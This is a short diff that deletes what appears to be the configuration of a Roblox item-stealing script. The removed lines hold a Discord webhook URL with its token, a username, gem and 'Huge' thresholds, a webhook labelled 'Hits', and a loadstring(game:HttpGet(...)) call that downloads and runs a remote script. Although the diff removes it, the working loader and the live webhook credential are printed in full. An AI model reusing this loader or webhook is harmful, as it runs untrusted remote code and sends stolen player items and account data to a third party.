@@ -1,10 +1,1 @@
-DualhookUsername = "MunchkinDog123"
-DualhookWebHook = "https://discord.com/api/webhooks/1203176081050308618/Yi5suqLtztHeBi-R_Z0cqn3vQ0qxaKRRq6kaMMPC80Snr4GMsN4KSYriUHaYnuxhIRDh"
 
-HugeSetting = 2
-GemSetting = 1500000
-
-LoadingScreenTitle = "2"
-WebHookName = "Hits"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriPremium/main/MoriPremium"))()
